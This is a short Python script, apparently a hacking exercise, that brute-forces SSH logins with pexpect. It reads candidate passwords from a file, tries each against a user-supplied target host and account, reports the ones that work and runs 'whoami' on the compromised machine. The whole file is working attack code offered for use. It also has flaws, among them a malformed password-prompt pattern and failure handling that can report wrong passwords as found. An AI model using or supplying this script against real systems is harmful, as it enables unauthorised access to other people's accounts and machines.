#!/usr/bin/python

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|password: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)
    return child   

def main():
    host = input("Enter IP Address of Target to Bruteforce: ")
    user = input("Enter User Account You Want To Bruteforce: ")
    file = open('passwords.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child = connect(user, host, password)
            print(colored('[+] Password Found: ' + password , 'green'))
            send_command(child,'whoami')
        except:
            print(colored('[-] Wrong Password: ' + password, 'red'))

main()